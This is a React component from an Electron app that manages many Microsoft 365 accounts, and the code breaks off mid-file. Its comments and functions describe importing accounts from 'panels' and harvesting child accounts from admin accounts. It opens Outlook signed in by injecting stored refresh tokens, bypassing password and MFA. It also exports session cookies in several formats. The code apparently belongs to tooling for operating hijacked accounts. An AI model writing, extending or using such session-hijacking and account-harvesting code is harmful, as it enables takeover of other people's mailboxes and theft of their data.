import { useState, useEffect, type FC } from 'react';
import {
  refreshAccountToken,
  openOutlookWeb,
  openPanelAdminDashboard,
  harvestAssociatedAccounts,
} from '../../services/accountSyncService';
import { getAccounts, deleteAccount, replacePanelTag, mergeDuplicateAccounts } from '../../services/accountService';
import { getSystemTags, getUserTags } from '../../services/tagService';
import { Tag } from '../../../types/store';
import { Panel } from '../../../types/panel';
import { getPanels } from '../../services/panelService';
import AddAccountModal, { type AddAccountInitialTab } from '../AddAccountModal';
import DeleteConfirmModalComponent from '../DeleteConfirmModal';
import TagEditorModalComponent from '../TagEditorModal';
import ExportModalComponent from '../ExportModal';
import CookieExportModal from '../CookieExportModal';
import ReAuthModal from '../ReAuthModal';
import GrantAdminScopeModal from '../GrantAdminScopeModal';

interface AccountsViewProps {
  /** When set (e.g. from Dashboard), open Add Account on this tab once, then call onOpenAddAccountConsumed. */
  openAddAccountWithTab?: AddAccountInitialTab | null;
  onOpenAddAccountConsumed?: () => void;
}

const AccountsView: FC<AccountsViewProps> = ({
  openAddAccountWithTab = null,
  onOpenAddAccountConsumed,
}) => {
  // Data
  const [accounts, setAccounts] = useState<any[]>([]);
  const [panels, setPanels] = useState<Panel[]>([]);
  const [systemTags, setSystemTags] = useState<Tag[]>([]);
  const [userTags, setUserTags] = useState<Tag[]>([]);
  const [loading, setLoading] = useState(false);

  // UI state
  const [selectedAccounts, setSelectedAccounts] = useState<string[]>([]);
  const [showAddModal, setShowAddModal] = useState(false);
  const [addModalInitialTab, setAddModalInitialTab] = useState<AddAccountInitialTab | undefined>(undefined);
  const [showEditTagsModal, setShowEditTagsModal] = useState(false);
  const [showExportModal, setShowExportModal] = useState(false);
  const [cookieExportTarget, setCookieExportTarget] = useState<{ id: string; email: string } | null>(null);
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
  const [activeAccount, setActiveAccount] = useState<string | null>(null); // for single‑account actions
  const [openDropdownId, setOpenDropdownId] = useState<string | null>(null);
  const [dropdownPosition, setDropdownPosition] = useState<{ top: number; left: number; maxHeight: number } | null>(null);
  const [statusFilter, setStatusFilter] = useState<'all' | 'active' | 'expired'>('all');
  /** When set, filters the table to children of this admin email
   *  (matches the `child-of:<email>` tag set by harvestAssociatedAccounts). */
  const [childOfFilter, setChildOfFilter] = useState<string | null>(null);
  /** Account currently being re-authenticated (Microsoft revoked its refresh token). */
  const [reAuthAccountId, setReAuthAccountId] = useState<string | null>(null);
  /** Account currently being granted admin Graph scope. */
  const [grantAdminAccountId, setGrantAdminAccountId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [sortBy, setSortBy] = useState<'added-desc' | 'added-asc' | 'email-asc' | 'email-desc'>('added-desc');
  const [openWindowAccountIds, setOpenWindowAccountIds] = useState<string[]>([]);

  // Pagination
  const [itemsPerPage, setItemsPerPage] = useState<number>(10);
  const [currentPage, setCurrentPage] = useState<number>(1);

  // Dropdown positioning
  const handleToggleDropdown = (accountId: string, event: React.MouseEvent) => {
    const button = event.currentTarget as HTMLButtonElement;
    if (openDropdownId === accountId) {
      // closing
      setOpenDropdownId(null);
      setDropdownPosition(null);
    } else {
      // opening
      const rect = button.getBoundingClientRect();
      const dropdownWidth = 220;
      const dropdownHeight = 420; // approximate; actual menu scrolls if taller
      const viewportWidth = window.innerWidth;
      const viewportHeight = window.innerHeight;
      const viewportPadding = 8;
      let left = rect.left;
      let top = rect.bottom + 2; // small gap

      // Adjust horizontally if dropdown would overflow right edge
      if (left + dropdownWidth > viewportWidth - viewportPadding) {
        left = viewportWidth - dropdownWidth - viewportPadding;
      }
      if (left < viewportPadding) left = viewportPadding;
      // Adjust vertically if dropdown would overflow bottom edge
      if (top + dropdownHeight > viewportHeight - viewportPadding) {
        top = rect.top - dropdownHeight; // position above button
      }
      if (top < viewportPadding) {
        top = viewportPadding;
      }
      const maxHeight = Math.max(180, viewportHeight - top - viewportPadding);
      setDropdownPosition({ top, left, maxHeight });
      setOpenDropdownId(accountId);
    }
  };

  // Load data on mount
  useEffect(() => {
    loadData();
  }, []);

  useEffect(() => {
    if (!openAddAccountWithTab) return;
    setAddModalInitialTab(openAddAccountWithTab);
    setShowAddModal(true);
    const t = window.setTimeout(() => {
      onOpenAddAccountConsumed?.();
    }, 0);
    return () => window.clearTimeout(t);
  }, [openAddAccountWithTab, onOpenAddAccountConsumed]);

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      if (!target.closest('.act-menu-wrap')) {
        setOpenDropdownId(null);
        setDropdownPosition(null);
      }
    };
    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, []);

  // Close dropdown on scroll or resize
  useEffect(() => {
    const handleScrollOrResize = () => {
      setOpenDropdownId(null);
      setDropdownPosition(null);
    };
    window.addEventListener('scroll', handleScrollOrResize);
    window.addEventListener('resize', handleScrollOrResize);
    return () => {
      window.removeEventListener('scroll', handleScrollOrResize);
      window.removeEventListener('resize', handleScrollOrResize);
    };
  }, []);

  // Poll for open Outlook windows every 2 seconds
  useEffect(() => {
    const interval = setInterval(async () => {
      try {
        const ids = await window.electron.actions.getOpenOutlookWindows();
        setOpenWindowAccountIds(ids);
      } catch (error) {
        console.error('Failed to fetch open windows', error);
      }
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  // Helper: get tag object by id
  // Generate a consistent color for a tag id
  const generateTagColorFromId = (id: string): string => {
    const colors = ['#3b82f6', '#10b981', '#8b5cf6', '#f59e0b', '#ef4444', '#06b6d4', '#8b5cf6', '#84cc16', '#f97316', '#6366f1'];
    let hash = 0;
    for (let i = 0; i < id.length; i++) {
      hash = ((hash << 5) - hash) + id.charCodeAt(i);
      hash |= 0;
    }
    const index = Math.abs(hash) % colors.length;
    return colors[index];
  };

  const loadData = async () => {
    setLoading(true);
    console.log('Loading accounts data...');
    try {
      const [accs, sys, usr, panelList] = await Promise.all([
        getAccounts(),
        getSystemTags(),
        getUserTags(),
        getPanels(),
      ]);
      // Fix orphaned panel tags
      const panelIds = new Set(panelList.map(p => p.id));
      const orphanedPanelIds = new Set<string>();
      accs.forEach(acc => {
        if (acc.panelId && !panelIds.has(acc.panelId)) {
          orphanedPanelIds.add(acc.panelId);
        }
      });
      for (const panelId of orphanedPanelIds) {
        await replacePanelTag(panelId, 'detached', true);
      }
      // Merge duplicate accounts (same email across panels)
      await mergeDuplicateAccounts();
      // Re-fetch accounts to get the updated list
      const updatedAccounts = await getAccounts();
      // Create panel tags for existing panels
      const panelTags = panelList.map(panel => ({
        id: `panel-${panel.id}`,
        name: panel.name,
        color: generateTagColorFromId(panel.id),
        icon: 'fa-server',
        type: 'system' as const,
        locked: true,
      }));
      setAccounts(updatedAccounts);
      console.log('Accounts updated:', updatedAccounts.length);
      setSystemTags([...sys, ...panelTags]);
      setUserTags(usr);
      setPanels(panelList);
    } catch (error) {
      console.error('Failed to load data:', error);
      alert(`Refresh failed: ${error instanceof Error ? error.message : String(error)}`);
    } finally {
      setLoading(false);
    }
  };

  const getTagById = (id: string): Tag | undefined => {
    // Check if it's a panel tag
    if (id.startsWith('panel-')) {
      const panelId = id.slice(6); // remove 'panel-' prefix
      const panel = panels.find(p => p.id === panelId);
      return {
        id,
        name: panel ? panel.name : `Panel ${panelId} (detached)`,
        color: generateTagColorFromId(panelId),
        icon: 'fa-server',
        type: 'system' as const,
        locked: true,
      };
    }
    return [...systemTags, ...userTags].find(t => t.id === id);
  };

  // Pick a contrasting text color (black or white) for a hex background so
  // user-tag chips stay legible regardless of the user's chosen color.
  const getContrastColor = (hexColor: string): string => {
    const hex = hexColor.startsWith('#') ? hexColor.slice(1) : hexColor;
    if (!/^[0-9A-F]{6}$/i.test(hex)) return '#000000';
    const r = parseInt(hex.slice(0, 2), 16);
    const g = parseInt(hex.slice(2, 4), 16);
    const b = parseInt(hex.slice(4, 6), 16);
    const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
    return luminance > 128 ? '#000000' : '#ffffff';
  };

  // Individual token refresh
  const handleRefreshToken = async (accountId: string) => {
    const account = accounts.find(a => a.id === accountId);
    const label = account?.email || accountId;
    setLoading(true);
    try {
      const updated = await refreshAccountToken(accountId);
      const stamp = updated.lastRefresh
        ? new Date(updated.lastRefresh).toLocaleTimeString()
        : new Date().toLocaleTimeString();
      alert(`Refreshed ${label} at ${stamp}\nStatus: ${updated.status}`);
      await loadData();
    } catch (error: any) {
      const code = error?.code || '';
      const detail = code === 'REFRESH_TOKEN_EXPIRED'
        ? 'Microsoft revoked this refresh token. Use "Sign in again" to re-authenticate.'
        : (error?.message || String(error));
      alert(`Refresh failed for ${label}: ${detail}`);
    } finally {
      setLoading(false);
    }
  };

  // Re-apply cookies for cookie accounts. Useful as a manual sanity check that
  // the stored cookies still produce a working OWA session.
  const handleReapplyCookies = async (accountId: string) => {
    const account = accounts.find(a => a.id === accountId);
    const label = account?.email || accountId;
    setLoading(true);
    try {
      const result = await window.electron.accounts.reapplyCookies(accountId);
      if (!result.success) {
        throw new Error(result.error || 'Reapply failed');
      }
      alert(
        `Reapplied cookies for ${label}\n\n` +
        `Parsed: ${result.parsed ?? 0}\n` +
        `Microsoft-related: ${result.microsoft ?? 0}\n` +
        `Successfully written: ${result.applied ?? 0}\n\n` +
        `Open Outlook to verify.`
      );
    } catch (error: any) {
      alert(`Reapply cookies failed for ${label}: ${error?.message || String(error)}`);
    } finally {
      setLoading(false);
    }
  };

  // OWA (outlook.office.com) with token injection — play button and “Open Outlook (Web)”
  const handleOpenOutlookWeb = async (accountId: string) => {
    setLoading(true);
    try {
      // Default to token path on Play for Microsoft token accounts.
      await openOutlookWeb(accountId, { authPreference: 'token' });
    } catch (error) {
      alert(`Failed to open Outlook (OWA): ${error instanceof Error ? error.message : error}`);
    } finally {
      setLoading(false);
    }
  };

  // True 1-click "Sign in (in-app browser)": opens the inbox in an in-app
  // Chromium window using the same engine Play uses (token-mode OWA window
  // with refresh-token bundle + Bearer header injection + MSAL cache + the
  // DefaultAnchorMailbox cookies). The user lands directly on the inbox
  // signed in — no password, MFA, or paste step.
  //
  // We deliberately use the proven Play engine instead of any cookies-only
  // path: OWA's session cookies (X-OWA-CANARY, etc.) only authenticate when
  // paired with the Bearer header the partition's webRequest hook injects
  // on every outbound request, and AAD itself never gives ESTSAUTH cookies
  // out for a refresh-token exchange. Without the hook OWA bounces straight
  // to login.
  const handleBrowserSignIn = async (accountId: string) => {
    setLoading(true);
    try {
      await openOutlookWeb(accountId, { authPreference: 'token' });
    } catch (error) {
      alert(`Browser sign-in failed: ${error instanceof Error ? error.message : error}`);
    } finally {
      setLoading(false);
    }
  };

  // Open Outlook in the user's *default OS browser* (Chrome / Safari /
  // Firefox / Edge) with the email pre-filled via login_hint. This cannot
  // be password-less because Microsoft refuses to issue session cookies
  // outside of an interactive sign-in, but it saves the "type your email"
  // step and inherits any existing AAD session the user already has there.
  const handleOpenInDefaultBrowser = async (accountId: string) => {
    setLoading(true);
    try {
      const r = await window.electron.actions.openOwaInDefaultBrowser(accountId);
      if (!r.success) throw new Error(r.error || 'Could not launch default browser');
    } catch (error) {
      alert(`Open in default browser failed: ${error instanceof Error ? error.message : error}`);
    } finally {
      setLoading(false);
    }
  };

  // Open the Cookie Export modal for this account. The modal surfaces all
  // four formats (Cookie-Editor JSON, console snippet, Cookie header,
  // Netscape file) with copy + save buttons.
  const handleExportCookies = (accountId: string) => {
    const account = accounts.find(a => a.id === accountId);
    setCookieExportTarget({ id: accountId, email: account?.email || accountId });
  };

  // Panel admin mailbox page (separate from OWA)


  // Individual admin harvest. After harvest, switch the table filter to
  // "children of <this admin>" so the user sees the new rows immediately.
  const handleAdminHarvest = async (accountId: string, source: 'panel' | 'graph' | 'both' = 'panel') => {
    setLoading(true);
    try {
      const account = accounts.find(a => a.id === accountId);
      const associated = await harvestAssociatedAccounts(accountId, { source });
      await loadData();
      if (account?.email) {
        const adminEmail = account.email.trim().toLowerCase();
        setChildOfFilter(adminEmail);
      }
      alert(`Harvested ${associated.length} associated accounts (source: ${source})`);
    } catch (error) {
      alert(`Harvest failed: ${error}`);
    } finally {
      setLoading(false);
    }
  };

  // Bulk token refresh
  const handleBulkRefresh = async () => {
    if (selectedAccounts.length === 0) {
      alert('No accounts selected');
      return;
    }
    setLoading(true);
    try {
      for (const accountId of selectedAccounts) {
        await refreshAccountToken(accountId);
      }
      alert(`Refreshed tokens for ${selectedAccounts.length} accounts`);
      setSelectedAccounts([]);
      await loadData();
    } catch (error) {
      alert(`Bulk refresh failed: ${error}`);
    } finally {
      setLoading(false);
    }
  };

  // Bulk export (placeholder – will call IPC)
  const handleBulkExport = () => {
    setShowExportModal(true);
  };

  // Bulk edit tags
  const handleBulkEditTags = () => {
    if (selectedAccounts.length === 0) {
      alert('No accounts selected');
      return;
    }
    setShowEditTagsModal(true);
  };

  // Bulk delete
  const handleBulkDelete = () => {
    if (selectedAccounts.length === 0) {
      alert('No accounts selected');
      return;
    }
    setShowDeleteConfirm(true);
  };

  // Individual edit tags
  const handleEditTags = (accountId: string) => {
    setActiveAccount(accountId);
    setShowEditTagsModal(true);
  };

  // Individual export account
  const handleExportAccount = (accountId: string) => {
    setActiveAccount(accountId);
    setShowExportModal(true);
  };

  // Individual delete account
  const handleDeleteAccount = async (accountId: string) => {
    if (!confirm('Delete this account? This cannot be undone.\n\nThe account will also be blocked from being re-added by panel sync.')) return;
    setLoading(true);
    try {
      await deleteAccount(accountId);
      alert('Account deleted');
      await loadData();
      // Notify App to update sidebar badge
      window.dispatchEvent(new CustomEvent('accounts-changed'));
    } catch (error) {
      alert(`Delete failed: ${error}`);
    } finally {
      setLoading(false);
    }
  };

  // Toggle account selection
  const toggleAccountSelection = (accountId: string) => {
    setSelectedAccounts(prev =>
      prev.includes(accountId)
        ? prev.filter(id => id !== accountId)
        : [...prev, accountId]
    );
  };

  // Select all accounts
  const handleSelectAll = () => {
    const allIds = accounts.map(a => a.id);
    setSelectedAccounts(prev =>
      prev.length === allIds.length ? [] : allIds
    );
  };

  // Add account
  const handleAddAccount = () => {
    setAddModalInitialTab(undefined);
    setShowAddModal(true);
  };



  // Manage tags (navigate to Settings)
  const handleManageTags = () => {
    // In a real app you would switch to Settings view
    alert('Navigate to Settings → Tag Management');
  };

  const handleCopyOutlookDebugLogs = async () => {
    try {
      const result = await window.electron.actions.copyOutlookDebugLogs();
      if (result?.success) {
        alert(`Copied ${result.lines} Outlook debug lines to clipboard.\nSaved to: ${result.path}`);
      } else {
        alert('Failed to copy Outlook debug logs');
      }
    } catch (error) {
      alert(`Failed to copy Outlook debug logs: ${error instanceof Error ? error.message : error}`);
    }
  };



  // Export modal




  // Helper: render tag pill
  const renderTag = (tagId: string) => {
    const tag = getTagById(tagId);
    if (!tag) return null;
    const isSystem = tag.type === 'system';
    // System tags with predefined CSS classes (.stag-{id} provides background).
    // For everything else (user tags, panel-* tags) we apply the user's chosen
    // color directly with an auto-computed contrasting text color so chips stay
    // readable on any background.
    const knownSystemTags = [
      'autorefresh',
      'admin',
      'detached',
      'cookie',
      'credential',
      'panel-prod',
      'panel-backup',
    ];
    const isKnownSystem = isSystem && knownSystemTags.includes(tag.id);
    let style: React.CSSProperties = {};
    let className = `stag ${isSystem ? 'stag-' + tag.id : 'tag'}`;
    if (!isKnownSystem && tag.color) {
      const textColor = getContrastColor(tag.color);
      style = {
        backgroundColor: tag.color,
        color: textColor,
        borderColor: tag.color,
      };
      className = 'stag tag';
    } else {
      style = { borderLeftColor: tag.color };
    }
    return (
      <span
        className={className}
        style={style}
        title={tag.name}
      >
        {isSystem && <i className="fas fa-lock stag-lock"></i>}
        {tag.name}
      </span>
    );
  };

  // Compute stats
  const totalAccounts = accounts.length;
  const activeAccounts = accounts.filter(a => a.status === 'active').length;
  const expiredAccounts = accounts.filter(a => a.status === 'expired').length;

  // Tag counts (simple)
  const tagCounts: Record<string, number> = {};
  accounts.forEach(acc => {
    acc.tags.forEach((tagId: string) => {
      tagCounts[tagId] = (tagCounts[tagId] || 0) + 1;
    });
  });

  // Filter accounts by selected tag (if any). Persisted via the main-process
  // state store so the user's last-selected sidebar tag survives a relaunch.
  const [activeTag, setActiveTagState] = useState<string | null>(null);
  const [activeTagLoaded, setActiveTagLoaded] = useState(false);

  useEffect(() => {
    void (async () => {
      try {
        const saved = await window.electron.state.get();
        if (saved && Object.prototype.hasOwnProperty.call(saved, 'activeTag')) {
          setActiveTagState(saved.activeTag ?? null);
        }
      } catch (err) {
        console.warn('Failed to restore activeTag:', err);
      } finally {
        setActiveTagLoaded(true);
      }
    })();
  }, []);

  const setActiveTag = (next: string | null) => {
    setActiveTagState(next);
    // Fire-and-forget; persistence failure shouldn't block the UI.
    void window.electron.state.update({ activeTag: next }).catch(() => {});
  };

  // Reset current page when filters change. Wait until we've finished
  // restoring activeTag so the first transition (null -> saved) doesn't
  // trigger a spurious page reset.
  useEffect(() => {
    if (!activeTagLoaded) return;
    setCurrentPage(1);
  }, [accounts, activeTag, statusFilter, searchTerm, sortBy, activeTagLoaded, childOfFilter]);
  const filteredAccounts = accounts.filter(acc => {
    if (activeTag && !acc.tags.includes(activeTag)) return false;
    if (statusFilter === 'active' && acc.status !== 'active') return false;
    if (statusFilter === 'expired' && acc.status !== 'expired') return false;
    if (searchTerm && !acc.email.toLowerCase().includes(searchTerm.toLowerCase()) && !acc.name?.toLowerCase().includes(searchTerm.toLowerCase())) return false;
    if (childOfFilter) {
      const want = `child-of:${childOfFilter}`;
      if (!acc.tags.includes(want)) return false;
    }
    return true;
  });

  // Sort filtered accounts
  const sortedAccounts = [...filteredAccounts].sort((a, b) => {
    switch (sortBy) {
      case 'added-desc': return new Date(b.added).getTime() - new Date(a.added).getTime();
      case 'added-asc': return new Date(a.added).getTime() - new Date(b.added).getTime();
      case 'email-asc': return a.email.localeCompare(b.email);
      case 'email-desc': return b.email.localeCompare(a.email);
      default: return 0;
    }
  });

  // Pagination calculations
  const totalPages = itemsPerPage === -1 ? 1 : Math.max(1, Math.ceil(filteredAccounts.length / itemsPerPage));
  const startIndex = (currentPage - 1) * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;
  const paginatedAccounts = itemsPerPage === -1 ? sortedAccounts : sortedAccounts.slice(startIndex, endIndex);

  // Panel ID set for existence checks
  const panelIds = new Set(panels.map(p => p.id));

  // Ensure current page is within bounds
  useEffect(() => {
    if (totalPages > 0 && currentPage > totalPages) {
      setCurrentPage(totalPages);
    } else if (currentPage < 1) {
      setCurrentPage(1);
    }
  }, [totalPages, currentPage]);

  // If loading, show spinner
  if (loading && accounts.length === 0) {
    return <div className="accounts-container">Loading accounts...</div>;
  }

  return (
    <div id="accountsView">
      <div className="accounts-container">
        {/* Left sidebar */}
        <div className="folders-sidebar">
          <div
            className={`folder-item ${activeTag === null ? 'active' : ''}`}
            data-tag="all"
            style={{ marginBottom: '12px', paddingBottom: '12px', borderBottom: '2px solid #e5e7eb' }}
            onClick={() => setActiveTag(null)}
          >
            <div className="folder-name"><div className="folder-icon"><i className="fas fa-layer-group"></i></div><span style={{ fontWeight: '700' }}>All Accounts</span></div>
            <div className="folder-count" style={{ fontSize: '14px', fontWeight: '700' }}>{totalAccounts}</div>
          </div>
          
          <div className="folders-title" style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
            <i className="fas fa-lock" style={{ fontSize: '9px', opacity: '0.6' }}></i> System Tags
          </div>
          {systemTags.map(tag => (
            <div
              key={tag.id}
              className={`folder-item ${activeTag === tag.id ? 'active' : ''}`}
              data-tag={tag.id}
              onClick={() => setActiveTag(tag.id)}
            >
              <div className="folder-name">
                <div className="folder-icon"><i className={`fas ${tag.icon || 'fa-tag'}`}></i></div>
                <span><span className="tag-circle" style={{ background: tag.color }}></span> {tag.name}</span>
              </div>
              <div className="folder-count">{tagCounts[tag.id] || 0}</div>
            </div>
          ))}

          <div className="folders-title" style={{ marginTop: '20px' }}>User Tags</div>
          {userTags.map(tag => (
            <div
              key={tag.id}
              className={`folder-item ${activeTag === tag.id ? 'active' : ''}`}
              data-tag={tag.id}
              onClick={() => setActiveTag(tag.id)}
            >
              <div className="folder-name">
                <div className="folder-icon"><i className="fas fa-tag"></i></div>
                <span><span className="tag-circle" style={{ background: tag.color }}></span> {tag.name}</span>
              </div>
              <div className="folder-count">{tagCounts[tag.id] || 0}</div>
            </div>
          ))}

          <div style={{ marginTop: '20px', padding: '0 4px', borderTop: '1px solid #e5e7eb', paddingTop: '16px' }}>
            <button className="action-btn secondary" id="manageTagsBtn" style={{ width: '100%', fontSize: '13px' }} onClick={handleManageTags}>
              <i className="fas fa-cog"></i> Manage Tags in Settings →
            </button>
          </div>
        </div>

        {/* Main area */}
        <div className="accounts-main">
          <div className="accounts-main-card">
            <div className="accounts-card-header">
              <div>
                <h2 className="accounts-card-title">Accounts</h2>
                <div className="accounts-stats">{totalAccounts} total · <span className="green">{activeAccounts} active</span> · {expiredAccounts} expired</div>
              </div>
              <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                <button className="icon-btn" onClick={handleCopyOutlookDebugLogs} title="Copy Outlook debug logs to clipboard">
                  <i className="fas fa-bug"></i>
                </button>
                <button className="icon-btn" onClick={loadData} title="Refresh accounts">
                  <i className="fas fa-sync-alt"></i>
                </button>

                <button className="add-btn" onClick={handleAddAccount}>
                  <i className="fas fa-plus"></i> Add Account
                </button>
              </div>
            </div>
            <div className="accounts-card-body">
              <div className="filter-chips">
                <div className={`chip ${statusFilter === 'all' ? 'active' : ''}`} onClick={() => setStatusFilter('all')}>All</div>
                <div className={`chip ${statusFilter === 'active' ? 'active' : ''}`} onClick={() => setStatusFilter('active')}>Active</div>
                <div className={`chip ${statusFilter === 'expired' ? 'active' : ''}`} onClick={() => setStatusFilter('expired')}>Expired</div>
                {childOfFilter && (
                  <div
                    className="chip active"
                    style={{ background: '#fef3c7', borderColor: '#fbbf24', color: '#92400e' }}
                    title="Click to clear this filter"
                    onClick={() => setChildOfFilter(null)}
                  >
                    Children of {childOfFilter} <i className="fas fa-times" style={{ marginLeft: 6 }}></i>
                  </div>
                )}
              </div>
              <div style={{ display: 'flex', gap: '12px', alignItems: 'center' }}>
                <div className="search-box">
                  <i className="fas fa-search"></i>
                  <input 
                    type="text" 
                    placeholder="Search accounts..." 
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                  />
                </div>
                <select 
                  className="sort-select" 
                  value={sortBy} 
                  onChange={(e) => setSortBy(e.target.value as any)}

                >
                  <option value="added-desc">Newest first</option>
                  <option value="added-asc">Oldest first</option>
                  <option value="email-asc">Email A-Z</option>
                  <option value="email-desc">Email Z-A</option>
                </select>
              </div>
            </div>
          </div>
          
          {/* Bulk bar */}
          {selectedAccounts.length > 0 && (
            <div className="bulk-bar" id="bulkBar" style={{ display: 'flex' }}>
              <span className="bulk-count" id="bulkCount">{selectedAccounts.length} selected</span>
              <div className="bulk-actions">
                <button className="bulk-btn" onClick={handleBulkRefresh} disabled={loading}>
                  <i className="fas fa-sync-alt"></i> Refresh Tokens
                </button>
                <button className="bulk-btn" onClick={handleBulkExport}>
                  <i className="fas fa-download"></i> Export
                </button>
                <button className="bulk-btn" onClick={handleBulkEditTags}>
                  <i className="fas fa-tags"></i> Edit Tags
                </button>
                <button className="bulk-btn bulk-btn-danger" onClick={handleBulkDelete}>
                  <i className="fas fa-trash"></i> Delete
                </button>
              </div>
              <button className="bulk-clear" onClick={() => setSelectedAccounts([])}>
                <i className="fas fa-times"></i>
              </button>
            </div>
          )}

          {/* Accounts table */}
          <div className="act-table">
            <div className="act-row act-header">
              <div className="act-check">
                <input
                  type="checkbox"
                  id="selectAll"
                  title="Select all"
                  checked={selectedAccounts.length === filteredAccounts.length && filteredAccounts.length > 0}
                  onChange={handleSelectAll}
                />
              </div>
              <div className="act-play"></div>
              <div className="act-account">Account</div>
              <div className="act-status">Status</div>
              <div className="act-added">Added</div>
              <div className="act-tags">Tags</div>
              <div className="act-actions">Actions</div>
            </div>
            
            {paginatedAccounts.map(account => (
              <div className="act-row" key={account.id}>
                <div className="act-check">
                  <input
                    type="checkbox"
                    className="row-check"
                    checked={selectedAccounts.includes(account.id)}
                    onChange={() => toggleAccountSelection(account.id)}
                  />
                </div>
                <div className="act-play">
                  <button
                    className="icon-btn"
                    title="Open Outlook on the web (OWA) for this account"
                    onClick={() => handleOpenOutlookWeb(account.id)}
                    disabled={loading}
                  >
                    <i className="fas fa-play"></i>
                  </button>
                </div>
                <div className="act-account">
                  <div className="avatar" style={{ background: account.avatarColor || `linear-gradient(135deg, #3b82f6, #2563eb)` }}>
                    {account.email.substring(0, 2).toUpperCase()}
                  </div>
                  <div className="act-account-info">
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
                      <div className="act-email">{account.email}</div>
                      {account.requiresReauth && (
                        <button
                          type="button"
                          className="action-btn"
                          style={{
                            padding: '2px 8px',
                            fontSize: 11,
                            background: '#fef3c7',
                            color: '#92400e',
                            border: '1px solid #fbbf24',
                            borderRadius: 4,
                          }}
                          title={account.lastError || 'Microsoft revoked this refresh token'}
                          onClick={(e) => {
                            e.stopPropagation();
                            setReAuthAccountId(account.id);
                          }}
                        >
                          <i className="fas fa-sign-in-alt" style={{ marginRight: 4 }} />
                          Sign in again
                        </button>
                      )}
                    </div>
                    <div
                      className="act-name"
                      title={
                        account.lastRefresh
                          ? `Last refresh: ${new Date(account.lastRefresh).toLocaleString()}`
                          : 'Never refreshed'
                      }
                    >
                      {account.name || '-'}
                      {account.lastRefresh && (
                        <span style={{ marginLeft: 8, color: '#9ca3af', fontSize: 11 }}>
                          · refreshed {(() => {
                            const diff = Date.now() - new Date(account.lastRefresh).getTime();
                            const min = Math.floor(diff / 60000);
                            if (min < 1) return 'just now';
                            if (min < 60) return `${min}m ago`;
                            const hr = Math.floor(min / 60);
                            if (hr < 24) return `${hr}h ago`;
                            const d = Math.floor(hr / 24);
                            return `${d}d ago`;
                          })()}
                        </span>
                      )}
                    </div>
                  </div>
                </div>
                <div className="act-status">
                  {(() => {
                    const isOpen = openWindowAccountIds.includes(account.id);
                    const displayStatus = isOpen ? 'OPEN' : account.status;
                    const className = `status-pill ${account.status} ${isOpen ? 'open' : ''}`;
                    return (
                      <span className={className.trim()}>{displayStatus}</span>
                    );
                  })()}
                </div>
                <div className="act-added">
                  {new Date(account.added).toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}
                </div>
                <div className="act-tags">
                  {account.tags
                    .filter((tagId: string) => tagId !== 'admin')
                    .map((tagId: string) => (
                      <span key={tagId}>
                        {renderTag(tagId)}
                      </span>
                    ))}
                  {account.tags.includes('admin') && (
                    <span
                      className={`stag stag-admin${
                        (account.panelId && panelIds.has(account.panelId)) || account.auth?.type === 'token' ? ' stag-clickable' : ''
                      }`}
                      title={
                        account.auth?.type === 'token'
                          ? 'Open Microsoft Exchange admin center (uses this account\u2019s session)'
                          : account.panelId && panelIds.has(account.panelId)
                            ? 'Open panel admin in-app'
                            : 'Link a panel or add a Microsoft token for admin UIs'
                      }
                      role={(account.panelId && panelIds.has(account.panelId)) || account.auth?.type === 'token' ? 'button' : undefined}
                      style={{
                        cursor: (account.panelId && panelIds.has(account.panelId)) || account.auth?.type === 'token' ? 'pointer' : 'default',
                      }}
                      onClick={
                        (account.panelId && panelIds.has(account.panelId)) || account.auth?.type === 'token'
                          ? (e) => {
                              e.stopPropagation();
                              void openPanelAdminDashboard(account.id).catch(err =>
                                alert(err instanceof Error ? err.message : String(err))
                              );
                            }
                          : undefined
                      }
                    >
                      <i className="fas fa-lock stag-lock"></i>Admin ↗
                    </span>
                  )}
                </div>
                <div className="act-actions">
                  <div className="act-menu-wrap">
                    <button className="act-menu-btn" onClick={(e) => handleToggleDropdown(account.id, e)}>
                      <i className="fas fa-ellipsis-v"></i>
                    </button>
                    <div className={`act-dropdown ${openDropdownId === account.id ? 'open' : ''}`} style={openDropdownId === account.id && dropdownPosition ? { top: dropdownPosition.top, left: dropdownPosition.left } : undefined}>
                      {account.auth?.type === 'token' && (
                        <div className="act-dropdown-item" onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleRefreshToken(account.id); }}
                             title="Refresh this account's Microsoft access + refresh token now (extends the session).">
                          <i className="fas fa-sync-alt"></i> Refresh token now
                        </div>
                      )}
                      {account.auth?.type === 'cookie' && (
                        <div className="act-dropdown-item" onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); void handleReapplyCookies(account.id); }}
                             title="Re-apply the stored cookie paste to this account's OWA partition.">
                          <i className="fas fa-cookie"></i> Reapply cookies now
                        </div>
                      )}
                      <div className="act-dropdown-item" onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleEditTags(account.id); }}>
                        <i className="fas fa-tags"></i> Edit Tags
                      </div>
                      <div className="act-dropdown-item" onClick={() => { setOpenDropdownId(null); setDropdownPosition(null); handleExportAccount(account.id); }}>
                        <i className="fas fa-download"></i> Export Account
                      </div>
                      {account.auth?.type === 'token' && (
                        <div
                          className="act-dropdown-item"
                          onClick={() => {
                            setOpenDropdownId(null);
                            setDropdownPosition(null);
                            void handleBrowserSignIn(account.id);
                          }}
                          title="Open Outlook on the web for this account in an in-app Chromium window already signed in via the stored refresh token (no password, MFA, or paste step). This is the only true password-less path; Microsoft does not issue AAD session cookies for refresh-token exchange so a real OS browser cannot be auto-signed-in."
                        >
                          <i className="fas fa-window-maximize"></i> Sign in (in-app browser, 1-click)
                        </div>
                      )}
                      {account.auth?.type === 'token' && (
                        <div
                          className="act-dropdown-item"
                          onClick={() => {
                            setOpenDropdownId(null);
                            setDropdownPosition(null);
